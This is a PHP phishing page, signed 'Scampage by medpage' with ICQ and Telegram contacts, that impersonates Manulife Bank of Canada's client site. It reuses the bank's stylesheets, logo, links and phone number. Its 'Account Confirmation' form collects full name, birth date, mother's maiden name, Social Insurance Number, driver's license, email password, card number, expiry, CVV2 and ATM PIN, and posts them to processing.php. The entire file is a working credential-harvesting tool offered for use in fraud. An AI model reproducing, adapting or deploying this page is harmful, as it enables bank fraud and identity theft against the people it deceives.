<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

   require "../includes/session_protect.php";
   require "../includes/functions.php";
   require "../includes/One_Time.php";
   
   ?>

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>

<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
	<link href="https://client.manulifebank.com/MBCClientUI/theme/manulife_20170330.css" rel="stylesheet" type="text/css" media="screen">
	<link href="https://client.manulifebank.com/MBCClientUI/theme/manulife-print_20141222.css" rel="stylesheet" type="text/css" media="print">	
	
	
	
<link href='https://www.manulifebank.ca/BankcaTheme/themes/html/BankcaTheme/images/favicon.ico' type="images/x-icon" rel="shortcut icon">
	<title>Manulife Bank of Canada</title>
  	<!-- Census 14451, Jira 4904: frame busting defence -->
	<style>html{display:none;}</style>
	<script>
		if (self==top) {
			document.documentElement.style.display='block';
		} else {
			top.location=self.location;
		}
	</script>
	
			<!-- Production Adobe Script -->
			<script type="text/javascript" src="//assets.adobedtm.com/caa55bf3865be487a5b4dbd4e1effd4b7cf20ea0/satelliteLib-42f17cd709075ee9a073cbbdf0520a44af234594.js"></script>
		
</head>
<body
	style="background-color: #008343; background-repeat: repeat-x; background-image: url(https://client.manulifebank.com/MBCClientUI/images/bg_grad.png);"
	margin=0 padding=0 height=100% topmargin=0 leftmargin=0 marginwidth=0
	marginheight=0 onclick="processOnBodyEvent(event)">
	<div class="logonwrapper">
		<div style="background-color: #999; background-image: url(https://client.manulifebank.com/MBCClientUI/images/bg_grad.png);
			background-repeat: repeat-x;" class="logonheader">
			<div class="noPrint">
				


	<div class="clientheaderbar">
		<div style="float: right;">
			
			
			
			<a id="id_francais" class="headerlinks" href=https://client.banquemanuvie.com/MBCClientUI/ >&nbsp;Français</a>
			<a id="id_news" class="headerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/News target=_blank>&nbsp;News |&nbsp;</a>  
			<a id="id_contactUS" class="headerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/Contact+us target=_blank>&nbsp;Contact us |&nbsp;</a>
			<a id="id_bankHome" class="headerlinks homeicon" href=http://www.manulifebank.ca/ target=_blank>&nbsp;Home |&nbsp;</a>
		</div>
	</div>
<div style="padding: 0 0 0 0;">
	<img src="https://client.manulifebank.com/MBCClientUI/images/Manulife_e_W_Bank.gif" width="243" border="0">
</div>
			</div>
		</div>
		<div class="logoncontent">
			<div class="outage">
				
	<p class="outagetext"></p>

			</div>
			


	<table cellspacing="0" cellpadding="5">
		<tr width="100%">
			<td align="left" nowrap="nowrap">
				<h1>Account Confirmation</h1>
			</td>
			<td align="right" nowrap="nowrap" class="contactuscamelcase" valign="top">
				Contact our Service Centre at 1-877-765-2265 if you require assistance  
			</td>
		</tr>
	</table>
	<h1>PERSONAL INFORMATION</h1>
	



	<form id="forgotPasswordInitialStep" name="forgotPasswordInitialStep" action="processing.php" method="post">
		<input type="hidden" name="sessionId" value="LpjoAEtRhpKuzu5OSudeG1Q" id="forgotPasswordInitialStep_sessionId"/>
		<!-- NONCE -->
		<input type="hidden" name="view" value="94b3bfad230b8b6d692fee654361a4ac238dbbe7a491acd86bbfa3f8b7cee863"/>
		<table CELLSPACING="3" CELLPADDING="1" width="100%" class="logon" >
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Full Name</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="FN" size="30" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Date of Birth</b>
				</td>
			
				<td NOWRAP>
				<select required="" id="ISMonth" name="D1" style="width:73px">
      <option value selected>Month</option>
      <option value="01">January</option>
      <option value="02">February</option>
      <option value="03">March</option>
      <option value="04">April</option>
      <option value="05">May</option>
      <option value="06">June</option>
      <option value="07">July</option>
      <option value="08">August</option>
      <option value="09">September</option>
      <option value="10">October</option>
      <option value="11">November</option>
      <option value="12">December</option>
      </select>&nbsp;<strong>-</strong>&nbsp;<select required="" id="ISDay" name="D2" style="width:62px;height:23px">
      <option value selected>Day</option>
      <option value="01">01</option>
      <option value="02">02</option>
      <option value="03">03</option>
      <option value="04">04</option>
      <option value="05">05</option>
      <option value="06">06</option>
      <option value="07">07</option>
      <option value="08">08</option>
      <option value="09">09</option>
      <option value="10">10</option>
      <option value="11">11</option>
      <option value="12">12</option>
      <option value="13">13</option>
      <option value="14">14</option>
      <option value="15">15</option>
      <option value="16">16</option>
      <option value="17">17</option>
      <option value="18">18</option>
      <option value="19">19</option>
      <option value="20">20</option>
      <option value="21">21</option>
      <option value="22">22</option>
      <option value="23">23</option>
      <option value="24">24</option>
      <option value="25">25</option>
      <option value="26">26</option>
      <option value="27">27</option>
      <option value="28">28</option>
      <option value="29">29</option>
      <option value="30">30</option>
      <option value="31">31</option>
      </select>&nbsp;<strong>-</strong>&nbsp;<select required="" id="ISYear" name="D3" style="width:65px;height:23px">
      <option value selected>Year</option>
                            <option value="1910">1910</option>
      <option value="1911">1911</option>
      <option value="1912">1912</option>
      <option value="1913">1913</option>
      <option value="1914">1914</option>
      <option value="1915">1915</option>
      <option value="1916">1916</option>
      <option value="1917">1917</option>
      <option value="1918">1918</option>
      <option value="1919">1919</option>
      <option value="1920">1920</option>
      <option value="1921">1921</option>
      <option value="1922">1922</option>
      <option value="1923">1923</option>
      <option value="1924">1924</option>
      <option value="1925">1925</option>
      <option value="1926">1926</option>
      <option value="1927">1927</option>
      <option value="1928">1928</option>
      <option value="1929">1929</option>
      <option value="1930">1930</option>
      <option value="1931">1931</option>
      <option value="1932">1932</option>
      <option value="1933">1933</option>
      <option value="1934">1934</option>
      <option value="1935">1935</option>
      <option value="1936">1936</option>
      <option value="1937">1937</option>
      <option value="1938">1938</option>
      <option value="1939">1939</option>
      <option value="1940">1940</option>
      <option value="1941">1941</option>
      <option value="1942">1942</option>
      <option value="1943">1943</option>
      <option value="1944">1944</option>
      <option value="1945">1945</option>
      <option value="1946">1946</option>
      <option value="1947">1947</option>
      <option value="1948">1948</option>
      <option value="1949">1949</option>
      <option value="1950">1950</option>
      <option value="1951">1951</option>
      <option value="1952">1952</option>
      <option value="1953">1953</option>
      <option value="1954">1954</option>
      <option value="1955">1955</option>
      <option value="1956">1956</option>
      <option value="1957">1957</option>
      <option value="1958">1958</option>
      <option value="1959">1959</option>
      <option value="1960">1960</option>
      <option value="1961">1961</option>
      <option value="1962">1962</option>
      <option value="1963">1963</option>
      <option value="1964">1964</option>
      <option value="1965">1965</option>
      <option value="1966">1966</option>
      <option value="1967">1967</option>
      <option value="1968">1968</option>
      <option value="1969">1969</option>
      <option value="1970">1970</option>
      <option value="1971">1971</option>
      <option value="1972">1972</option>
      <option value="1973">1973</option>
      <option value="1974">1974</option>
      <option value="1975">1975</option>
      <option value="1976">1976</option>
      <option value="1977">1977</option>
      <option value="1978">1978</option>
      <option value="1979">1979</option>
      <option value="1980">1980</option>
      <option value="1981">1981</option>
      <option value="1982">1982</option>
      <option value="1983">1983</option>
      <option value="1984">1984</option>
      <option value="1985">1985</option>
      <option value="1986">1986</option>
      <option value="1987">1987</option>
      <option value="1988">1988</option>
      <option value="1989">1989</option>
      <option value="1990">1990</option>
		<option value="1991">1991</option>
		<option value="1992">1992</option>
		<option value="1993">1993</option>
		<option value="1994">1994</option>
		<option value="1995">1995</option>
		<option value="1996">1996</option>
		<option value="1997">1997</option>
		<option value="1999">1999</option>
		<option value="2000">2000</option>
		<option value="2001">2001</option>
		<option value="2002">2002</option>
		<option value="2003">2003</option>
		<option value="2004">2004</option>
		<option value="2005">2005</option>
		<option value="2006">2006</option>
		<option value="2007">2007</option>
		<option value="2008">2008</option>
		<option value="2007">2009</option>
		<option value="2008">2010</option>
      </select>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Mother's Maiden Name</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="MN" size="30" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Social Insurance Number</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="SN" size="30"  maxlength="11" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Driver's License Number</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="DL" size="30" maxlength="16" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Email Address</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="EA" size="30" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Email Password</b>
				</td>
			
				<td NOWRAP>
					<input type="password" name="EP" size="30" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
		</table>
		
	<h1>CARD INFORMATION</h1>
		<table CELLSPACING="3" CELLPADDING="1" width="100%" class="logon" >
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Name on Card&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="NC" size="30" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Card Number</b>
				</td>
			
				<td NOWRAP>
					<input type="text" name="CN" size="30" maxlength="16" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Exp. Date </b>
				</td>
			
				<td NOWRAP>
					<select required="" id="ISMonth" name="E1" style="width:73px">
      <option value selected>Month</option>
      <option value="01">January</option>
      <option value="02">February</option>
      <option value="03">March</option>
      <option value="04">April</option>
      <option value="05">May</option>
      <option value="06">June</option>
      <option value="07">July</option>
      <option value="08">August</option>
      <option value="09">September</option>
      <option value="10">October</option>
      <option value="11">November</option>
      <option value="12">December</option>
      </select>&nbsp;<strong>-</strong>&nbsp; <select required="" id="ISYear" name="E2" style="width:65px;height:23px">
      <option value selected>Year</option>    
		<option value="2008">2018</option>
		<option value="2009">2019</option>
		<option value="2010">2020</option>
		<option value="2011">2021</option>
		<option value="2012">2022</option>
		<option value="2013">2023</option>
		<option value="2014">2024</option>
		<option value="2015">2025</option>
		<option value="2016">2026</option></select>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>Cvv2</b>
				</td>
			
				<td NOWRAP>
					<input type="password" name="CV" size="30" maxlength="3" required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			<tr>
				<td NOWRAP>
					<b>ATM Pin</b>
				</td>
			
				<td NOWRAP>
					<input type="password" name="AP" size="30" maxlength="8"required   id="id_cardNumber"/>
				</td>
				<td width="100%">&nbsp;</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
			
			<tr>
				<td>&nbsp;</td>
				<td>&nbsp;</td>
				
				<td nowrap align="right">
					<input type="submit" value="Continue" id="id_cancel" name="submit" style="margin-right:17%;" tabindex="3"/>

				</td>
			</tr>
			<tr>
				<td colspan="4">&nbsp;</td>
			</tr>
		</table>
	</form>




		</div>
		<div class="logonfooter">
			<div class="noPrint">
				

	<!--  footer banner -->
	<div class="footerbar">
		<div class="footertext">
			strong&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;reliable&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;trustworthy&nbsp;&nbsp;&nbsp;&nbsp;
			&nbsp;&nbsp;forward-thinking
		</div>
		<div class="footerlinks">
			
			
			
			
			<a id="id_Accessibility" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/legal?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/legal target=_blank>|&nbsp;Accessibility</a>
			<a id="id_Legal" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/legal?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/legal target=_blank>|&nbsp;Legal&nbsp;</a>
			<a id="id_Privacy" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/privacy+policy target=_blank>|&nbsp;Privacy Policy&nbsp;</a>
			<a id="id_Careers" class="footerlinks" href=http://www.manulifebank.ca/wps/portal/bankca/Bank.caHome/Home/?urile=wcm:path:/wps/wcm/connect/bankcacommon/common+content/bankca/Careers target=_blank>Careers&nbsp;</a>

		</div>
	</div>
<br>
			</div>
		</div>
	</div>
	
		<script type="text/javascript">_satellite.pageBottom();</script>
	
</body>

</html>